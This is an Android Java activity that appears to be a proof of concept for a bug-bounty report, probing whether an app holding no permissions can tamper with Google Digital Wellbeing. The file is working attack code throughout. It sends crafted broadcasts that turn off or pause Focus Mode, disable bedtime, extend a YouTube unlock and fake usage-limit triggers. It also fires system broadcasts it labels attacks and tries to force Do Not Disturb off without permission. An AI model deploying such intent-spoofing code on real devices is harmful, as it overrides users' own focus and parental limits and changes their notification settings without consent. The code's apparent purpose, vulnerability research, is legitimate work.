package com.vrp.zeroperm;

import android.app.Activity;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;

public class FocusModeProofActivity extends Activity {
    private static final String T = "FOCUSPROOF";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Focus Mode Effect Proof ===");
        Log.w(T, "UID=" + android.os.Process.myUid());

        checkDndState("BEFORE broadcast");
        checkZenMode("BEFORE broadcast");
        checkFocusModeSettings("BEFORE broadcast");

        sendFocusModeOff();
        sendFocusModePause();
        sendBedtimeChanged();
        sendSmartWrapOptOut();
        sendLimitTriggered();

        sendDoNotDisturbBroadcasts();
        testDndPolicyChange();

        new Handler().postDelayed(() -> {
            checkDndState("AFTER broadcasts (3s)");
            checkZenMode("AFTER broadcasts (3s)");
            checkFocusModeSettings("AFTER broadcasts (3s)");
            Log.w(T, "=== FOCUS MODE PROOF COMPLETE ===");
        }, 3000);
    }

    private void checkDndState(String label) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            int filter = nm.getCurrentInterruptionFilter();
            String[] filters = {"UNKNOWN", "ALL", "PRIORITY", "NONE", "ALARMS"};
            String filterName = filter >= 0 && filter < filters.length ? filters[filter] : "?";
            Log.w(T, "[*] DND " + label + ": filter=" + filterName + "(" + filter + ")");

            NotificationManager.Policy policy = nm.getNotificationPolicy();
            Log.w(T, "[*] DND Policy " + label +
                ": priorityCategories=" + policy.priorityCategories +
                " priorityCallSenders=" + policy.priorityCallSenders +
                " priorityMessageSenders=" + policy.priorityMessageSenders);
        } catch (Exception e) {
            Log.w(T, "[-] DND check: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }
    }

    private void checkZenMode(String label) {
        try {
            int zenMode = Settings.Global.getInt(getContentResolver(), "zen_mode", -1);
            Log.w(T, "[*] zen_mode " + label + ": " + zenMode);
        } catch (Exception e) {
            Log.w(T, "[-] zen_mode: " + e.getClass().getSimpleName());
        }

        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            int ringerMode = am.getRingerMode();
            String[] modes = {"SILENT", "VIBRATE", "NORMAL"};
            String modeName = ringerMode >= 0 && ringerMode < modes.length ? modes[ringerMode] : "?";
            Log.w(T, "[*] Ringer " + label + ": " + modeName + "(" + ringerMode + ")");
        } catch (Exception e) {
            Log.w(T, "[-] ringer: " + e.getClass().getSimpleName());
        }
    }

    private void checkFocusModeSettings(String label) {
        ContentResolver cr = getContentResolver();
        String[] keys = {
            "focus_mode_enabled",
            "bedtime_mode_enabled",
            "wind_down_enabled",
            "wind_down_active",
            "suppress_notifications",
        };

        for (String key : keys) {
            try {
                String val = Settings.Secure.getString(cr, key);
                if (val != null) {
                    Log.w(T, "[!!!] Settings.Secure." + key + " " + label + "=" + val);
                }
            } catch (Exception e) {}

            try {
                String val = Settings.Global.getString(cr, key);
                if (val != null) {
                    Log.w(T, "[!!!] Settings.Global." + key + " " + label + "=" + val);
                }
            } catch (Exception e) {}
        }
    }

    private void sendFocusModeOff() {
        Log.w(T, "--- Sending TURN_OFF_NOW ---");
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.focusmode.action.TURN_OFF_NOW");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.focusmode.manager.impl.FocusModeNotificationActionBroadcast_Receiver"));
            sendBroadcast(i);
            Log.w(T, "[+] TURN_OFF_NOW sent");
        } catch (Exception e) {
            Log.w(T, "[-] TURN_OFF_NOW: " + e.getClass().getSimpleName());
        }
    }

    private void sendFocusModePause() {
        Log.w(T, "--- Sending PAUSE ---");
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.focusmode.action.PAUSE");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.focusmode.manager.impl.FocusModeNotificationActionBroadcast_Receiver"));
            i.putExtra("PAUSE_DURATION_MS", 300000L);
            sendBroadcast(i);
            Log.w(T, "[+] PAUSE sent");
        } catch (Exception e) {
            Log.w(T, "[-] PAUSE: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.focusmode.action.RESUME");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.focusmode.manager.impl.FocusModeNotificationActionBroadcast_Receiver"));
            sendBroadcast(i);
            Log.w(T, "[+] RESUME sent");
        } catch (Exception e) {
            Log.w(T, "[-] RESUME: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.focusmode.action.SNOOZE");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.focusmode.manager.impl.FocusModeNotificationActionBroadcast_Receiver"));
            sendBroadcast(i);
            Log.w(T, "[+] SNOOZE sent");
        } catch (Exception e) {
            Log.w(T, "[-] SNOOZE: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.focusmode.action.EXTEND_SINGLE_APP_UNLOCK");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.focusmode.manager.impl.FocusModeNotificationActionBroadcast_Receiver"));
            i.putExtra("PACKAGE_NAME", "com.google.android.youtube");
            sendBroadcast(i);
            Log.w(T, "[+] EXTEND_SINGLE_APP_UNLOCK sent");
        } catch (Exception e) {
            Log.w(T, "[-] EXTEND: " + e.getClass().getSimpleName());
        }
    }

    private void sendBedtimeChanged() {
        Log.w(T, "--- Sending BEDTIME_CHANGED ---");
        try {
            Intent i = new Intent("com.google.android.deskclock.action.BEDTIME_CHANGED");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.bedtime.manager.SyncBedtimeBroadcastReceiver_Receiver"));
            i.putExtra("bedtime_enabled", false);
            sendBroadcast(i);
            Log.w(T, "[+] BEDTIME_CHANGED(disabled) sent");
        } catch (Exception e) {
            Log.w(T, "[-] BEDTIME_CHANGED: " + e.getClass().getSimpleName());
        }
    }

    private void sendSmartWrapOptOut() {
        Log.w(T, "--- Sending SMART_WRAP_OPT_OUT ---");
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.smartwrap.action.OPT_OUT");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.smartwrap.SmartWrapOptOutReceiver_Receiver"));
            sendBroadcast(i);
            Log.w(T, "[+] SMART_WRAP_OPT_OUT sent");
        } catch (Exception e) {
            Log.w(T, "[-] SMART_WRAP_OPT_OUT: " + e.getClass().getSimpleName());
        }
    }

    private void sendLimitTriggered() {
        Log.w(T, "--- Sending APP_USAGE_LIMIT_OBSERVER_TRIGGERED ---");
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.appconfig.limit.action.APP_USAGE_LIMIT_OBSERVER_TRIGGERED");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.appconfig.limit.impl.AppUsageLimitObserverBroadcastReceiver_Receiver"));
            i.putExtra("observer_id", 1);
            i.putExtra("time_limit", 0L);
            i.putExtra("time_used", 999999L);
            sendBroadcast(i);
            Log.w(T, "[+] LIMIT_OBSERVER sent");
        } catch (Exception e) {
            Log.w(T, "[-] LIMIT_OBSERVER: " + e.getClass().getSimpleName());
        }
    }

    private void sendDoNotDisturbBroadcasts() {
        Log.w(T, "--- DND/System Broadcast Attacks ---");

        try {
            Intent i = new Intent("android.app.action.INTERRUPTION_FILTER_CHANGED");
            sendBroadcast(i);
            Log.w(T, "[+] INTERRUPTION_FILTER_CHANGED sent");
        } catch (Exception e) {
            Log.w(T, "[-] INTERRUPTION: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("android.app.action.NOTIFICATION_POLICY_CHANGED");
            sendBroadcast(i);
            Log.w(T, "[+] NOTIFICATION_POLICY_CHANGED sent");
        } catch (Exception e) {
            Log.w(T, "[-] POLICY: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS");
            sendBroadcast(i);
            Log.w(T, "[+] CLOSE_SYSTEM_DIALOGS sent");
        } catch (Exception e) {
            Log.w(T, "[-] CLOSE_DIALOGS: " + e.getClass().getSimpleName());
        }
    }

    private void testDndPolicyChange() {
        Log.w(T, "--- DND Policy Change Attempt ---");
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            boolean canChange = nm.isNotificationPolicyAccessGranted();
            Log.w(T, "[*] DND policy access granted: " + canChange);

            if (!canChange) {
                nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE);
                Log.w(T, "[!!!] SET DND TO NONE — no permission check!");
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] DND set SECURITY: " + shortMsg(se));
        } catch (Exception e) {
            Log.w(T, "[-] DND set: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }
    }

    private String shortMsg(Exception e) {
        String msg = e.getMessage();
        if (msg == null) return "";
        return msg.substring(0, Math.min(msg.length(), 120));
    }
}
